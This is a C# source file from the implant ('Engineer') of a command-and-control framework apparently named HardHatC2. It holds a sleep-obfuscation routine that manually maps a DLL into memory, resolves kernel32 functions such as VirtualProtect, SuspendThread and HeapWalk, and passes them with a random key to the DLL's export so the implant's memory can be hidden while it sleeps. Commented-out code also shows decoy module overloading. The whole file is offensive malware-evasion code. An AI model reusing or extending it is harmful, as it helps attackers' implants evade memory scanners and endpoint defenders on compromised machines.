using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;
using System.Threading.Tasks;
using Engineer.Extra;


namespace Engineer.Functions
{
    internal class Sleepydll
    {
        public static void ExecuteSleep(int sleeptime)
        {

            try
            {
                string sleepy64 = Program.SleepCode;
                //add a check to make sure sleepy64 is not the default value 
                //if (sleepy64 == "{{REPLACE_SLEEP_DLL}}")
                //{
                //    Console.WriteLine("Sleepy64.dll not found");
                //    return;
                //}

                //byte[] sleepyDllLoaded = Convert.FromBase64String(sleepy64);
                byte[] sleepyDllLoaded = File.ReadAllBytes("D:\\My_Custom_Code\\HardHatC2\\TeamServer\\Programs\\Extensions\\run3.dll");
                //Console.WriteLine($"dll is {sleepyDllLoaded.Length} bytes");

                string export = "run";
                //uses dinvoke to map and load sleep dll

                // find a decoy
               // var decoy = reprobate.FindDecoyModule(sleepyDllLoaded.Length, LegitSigned:false);

                //if (string.IsNullOrWhiteSpace(decoy))
                //{
                //    Console.WriteLine("Error: No suitable decoy found");
                //}
                //Console.WriteLine("found decoy trying to overload module");

                //ready the arguments 

                //get IntPtr to kernel32.dll
                IntPtr hKernel32 = SleepEncrypt.GetModuleHandle("kernel32.dll");
                //get IntPtr to Sleep
                IntPtr hSleep = SleepEncrypt.GetProcAddress(hKernel32, "Sleep");

                // get current process id
                int pid = Process.GetCurrentProcess().Id;

                //get current thread id
                uint tid = SleepEncrypt.GetCurrentThreadId();

                //make a char array of a-z
                char[] letter_keys = { 'a', 'b', 'c', 'd', 'e', 'f', 'g', 'h', 'i', 'j', 'k', 'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n', 'o', 'p', 'q', 'r', 's', 't', 'u', 'v', 'w', 'x', 'y', 'z' };
                //pick a random char from the array
                char random_char = letter_keys[new Random().Next(0, letter_keys.Length)];

                //get the base address of the current process
                IntPtr pBaseAddress = Process.GetCurrentProcess().MainModule.BaseAddress;
                //set the sleep time
                uint dwSleepTime = (uint)sleeptime;

                //get IntPtr to VirtualProtect
                IntPtr hVirtualProtect = SleepEncrypt.GetProcAddress(hKernel32, "VirtualProtect");
                //get intptr for OpenThread
                IntPtr hOpenThread = SleepEncrypt.GetProcAddress(hKernel32, "OpenThread");
                //get intptr for SuspendThread
                IntPtr hSuspendThread = SleepEncrypt.GetProcAddress(hKernel32, "SuspendThread");
                //get IntPtr for ResumeThread
                IntPtr hResumeThread = SleepEncrypt.GetProcAddress(hKernel32, "ResumeThread");
                //get intptr for CloseHandle
                IntPtr hCloseHandle = SleepEncrypt.GetProcAddress(hKernel32, "CloseHandle");
                //get intptr for HeapWalk
                IntPtr hHeapWalk = SleepEncrypt.GetProcAddress(hKernel32, "HeapWalk");
                //get intptr for GetProcessHeap
                IntPtr hGetProcessHeap = SleepEncrypt.GetProcAddress(hKernel32, "GetProcessHeap");
                //get intptr for  CreateToolhelp32Snapshot
                IntPtr hCreateToolhelp32Snapshot = SleepEncrypt.GetProcAddress(hKernel32, "CreateToolhelp32Snapshot");
                //get intptr for Thread32First
                IntPtr hThread32First = SleepEncrypt.GetProcAddress(hKernel32, "Thread32First");
                //get intptr for Thread32Next
                IntPtr hThread32Next = SleepEncrypt.GetProcAddress(hKernel32, "Thread32Next");
                //get intptr for HeapLock and HeapUnlock 
                IntPtr hHeapLock = SleepEncrypt.GetProcAddress(hKernel32, "HeapLock");

                IntPtr hHeapUnlock = SleepEncrypt.GetProcAddress(hKernel32, "HeapUnlock");


                SleepEncrypt.PARAMS pARAMS = new SleepEncrypt.PARAMS();
                pARAMS.dwSleepTime = dwSleepTime;
                pARAMS.pBaseAddress = pBaseAddress;
                pARAMS.hSleep = hSleep;
                pARAMS.hVirtualProtect = hVirtualProtect;
                pARAMS.Key = random_char;
                pARAMS.targetProcessId = (uint)pid;
                pARAMS.targetThreadId = tid;
                pARAMS.hOpenThread = hOpenThread;
                pARAMS.hSuspendThread = hSuspendThread;
                pARAMS.hResumeThread = hResumeThread;
                pARAMS.hCloseHandle = hCloseHandle;
                pARAMS.hHeapWalk = hHeapWalk;
                pARAMS.hGetProcessHeap = hGetProcessHeap;
                pARAMS.hCreateToolhelp32Snapshot = hCreateToolhelp32Snapshot;
                pARAMS.hThread32First = hThread32First;
                pARAMS.hThread32Next = hThread32Next;
                pARAMS.hHeapLock = hHeapLock;
                pARAMS.hHeapUnlock = hHeapUnlock;

                Console.WriteLine("Created arguments for code");

                //by making this I can pass the struct into my delegate and send any type of parameters such as arrays while before i could not when using a pointer to the struct directly.
                //int size = Marshal.SizeOf(pARAMS);
                //IntPtr arrPtr = Marshal.AllocHGlobal(size);
                //Marshal.StructureToPtr(pARAMS, arrPtr, true);
                //Console.WriteLine("mapped arguments into memory");
                object[] parameters = new object[] {pARAMS};


                //// map the module
                //var map = reprobate.OverloadModule(sleepyDllLoaded, decoy);
                //Console.WriteLine("module overloaded");

                //map the dll to memory
                var map = reprobate.MapModuleToMemory("D:\\My_Custom_Code\\HardHatC2\\TeamServer\\Programs\\Extensions\\run3.dll");
                //var map = reprobate.MapModuleFromDisk("D:\\My_Custom_Code\\HardHatC2\\TeamServer\\Programs\\Extensions\\run3.dll");
                Console.WriteLine("mapped dll to memory");

                // run
                Console.WriteLine("executing sleepy dll");
                var result = (int)reprobate.CallMappedDLLModuleExport(map.PEINFO, map.ModuleBase, export, typeof(WinApiDynamicDelegate.SleepDelegate), parameters,CallEntry:false);
                IntPtr functionAddress = reprobate.GetExportAddress(map.ModuleBase, export);
                //SleepEncrypt.SleepEncryptDelegate Run = (SleepEncrypt.SleepEncryptDelegate)Marshal.GetDelegateForFunctionPointer(functionAddress, typeof(SleepEncrypt.SleepEncryptDelegate));
                //int ReturnValue = Run(arrPtr);
                //Console.WriteLine("result: " + result);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.Message);
                Console.WriteLine(ex.StackTrace);
            }
        }
    }
}
